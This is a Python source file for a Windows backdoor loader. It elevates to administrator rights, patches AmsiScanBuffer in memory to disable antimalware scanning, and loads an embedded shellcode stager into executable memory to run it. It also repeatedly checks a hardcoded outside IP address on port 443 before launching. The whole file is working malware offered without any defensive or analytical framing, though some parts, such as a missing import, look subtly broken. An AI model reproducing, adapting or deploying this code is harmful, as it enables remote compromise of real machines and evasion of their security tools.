from subprocess import Popen, SW_HIDE, STARTUPINFO, STARTF_USESHOWWINDOW
from elevate import elevate
from multiprocessing import Process
from requests import get
from winreg import *
from shutil import copyfile
from time import sleep
import socket
import ctypes
import base64
import sys
import os

kernel32 = ctypes.windll.kernel32

def bypass_amsi():

	kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
	ntdll = ctypes.WinDLL('ntdll', use_last_error=True)

	PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
	MEM_COMMIT = 0x00001000
	PAGE_EXECUTE_READWRITE = 0x40

	def get_proc_address(module, func):
		handle = kernel32.GetModuleHandleW(module)
		if not handle:
			return None
		address = kernel32.GetProcAddress(handle, func)
		if not address:
			return None
		return address

	def patch_memory(address, data):
		size = len(data)
		old_protect = wintypes.DWORD()
		kernel32.VirtualProtect(address, size, PAGE_EXECUTE_READWRITE, ctypes.byref(old_protect))
		ctypes.memmove(address, data, size)
		kernel32.VirtualProtect(address, size, old_protect.value, ctypes.byref(old_protect))

	amsi = get_proc_address("amsi.dll", "AmsiScanBuffer")
	if amsi:
		patch_memory(amsi, b'\xC3')

def ShellCodeBackdoor():

	global buf

	buf =  b""
	buf += b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51"
	buf += b"\x41\x50\x52\x48\x31\xd2\x51\x56\x65\x48\x8b\x52"
	buf += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x4d\x31\xc9"
	buf += b"\x48\x4b\x72\x50\x48\x0f\xb7\x4a\x4a\x48\x31\xc0"
	buf += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
	buf += b"\x63\x34\x56\x6f\x56\x71\x65\x45\x4b\x75\x79\x5a"
	buf += b"\x41\x68\x59\x5f\x6b\x48\x65\x6e\x38\x35\x70\x49"
	buf += b"\x30\x67\x37\x4c\x46\x4c\x69\x5f\x4a\x6a\x6b\x35"
	buf += b"\x35\x5d\x2d\x68\x79\x78\x66\x49\x6e\x79\x35\x36"
	buf += b"\x30\x49\x77\x7a\x25\x3c\x67\x79\x46\x46\x35\x46"
	buf += b"\x73\x41\x69\x35\x77\x7a\x69\x75\x5a\x4a\x43\x6b"
	buf += b"\x78\x38\x78\x55\x59\x75\x44\x50\x72\x72\x48\x62"
	buf += b"\x4c\x43\x33\x63\x39\x2d\x73\x72\x64\x55\x74\x38"
	buf += b"\x78\x61\x37\x51\x5f\x2d\x52\x73\x6a\x72\x57\x32"
	buf += b"\x75\x72\x47\x2f\x65\x37\x57\x74\x32\x73\x61\x51"
	buf += b"\x41\x51\x46\x49\x70\x45\x69\x41\x54\x39\x36\x54"
	buf += b"\x45\x69\x65\x4e\x42\x50\x33\x54\x6d\x62\x61\x00"
	buf += b"\x48\x89\xc1\x27\x5a\x41\x58\x4d\x31\xc9\x53\x48"
	buf += b"\xb8\x00\x32\xa8\x84\x00\x00\x00\x00\x50\x53\x53"
	buf += b"\x45\xc7\xc2\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6"
	buf += b"\x6a\x0a\x8f\x48\x89\xf1\x6a\x1f\x5a\x52\x68\x80"
	buf += b"\x33\x00\x00\x49\x89\xe0\x6a\x04\x41\x59\x49\xba"
	buf += b"\x75\x52\x9e\x86\x00\x00\x00\x00\xff\xd5\x4d\x31"
	buf += b"\xc0\x53\x5a\x48\x89\xf1\x4d\x31\xc9\x4d\x31\xc9"
	buf += b"\x53\x53\x49\xc7\xc2\x2d\x06\x18\x7b\xff\xd5\x85"
	buf += b"\xc0\x75\x1f\x48\xc7\xc1\x88\x13\x00\x00\x49\xba"
	buf += b"\x44\xf0\x35\xe0\x00\x00\x00\x00\xff\xd5\x48\xff"
	buf += b"\xcf\x74\x02\xeb\xaa\xe8\x55\x00\x00\x00\x53\x59"
	buf += b"\x6a\x40\x5a\x49\x89\xd1\xc1\xe2\x10\x49\xc7\xc0"
	buf += b"\x00\x10\x00\x00\x49\xba\x58\xa4\x53\xe5\x00\x00"
	buf += b"\x00\x00\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48"
	buf += b"\x89\xf1\x48\x89\xda\x49\xc7\xc0\x00\x20\x00\x00"
	buf += b"\x49\x89\xf9\x49\xba\x12\x96\x89\xe2\x00\x00\x00"
	buf += b"\x00\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb2\x66"
	buf += b"\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd2\x58\xc3\x58"
	buf += b"\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5"

	return buf

def write_memory(buf):

	length = len(buf)

	kernel32.VirtualAlloc.restype = ctypes.c_void_p

	kernel32.RtlMoveMemory.argtypes = (
		ctypes.c_void_p,
		ctypes.c_void_p,
		ctypes.c_size_t
	)

	ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
	kernel32.RtlMoveMemory(ptr, buf, length)

	return ptr

def run(shellcode):
	buffer = ctypes.create_string_buffer(shellcode)

	ptr = write_memory(buffer)

	shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
	shell_func()

def check_connection(server_ip, server_port):
	while True:
		sock = None

		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

			res_ = sock.connect_ex(( server_ip, server_port ))

			if res_ == 0:
				#print("EXCELLENT", res_)

				sleep(3)

				sock.close()
				sock = None

				sleep(5)

				recursive_run()

				return False
			else:
				#print("NO connection")

				sleep(3)

				sock.close()
				sock = None

				sleep(5)

		except Exception as warning_:

			try:
				sock.close()
				sock = None
			except Exception as ClosedSocked_:
				#print(ClosedSocked_)
				sleep(5)

			#print(warning_)
			sleep(5)

def recursive_run():
	shellcode = ShellCodeBackdoor()
	run(shellcode)


def main():
	try:
		elevate()

		process1 = Process( target = check_connection, args=("185.65.195.121", 443) )
		#process2 = Process( target = emergency_restart )

		process1.start()
		#process2.start()

		process1.join()
		#process2.join()

	except Exception as mainError_:
		
		sleep(15)
		main()

if __name__ == '__main__':
	main()
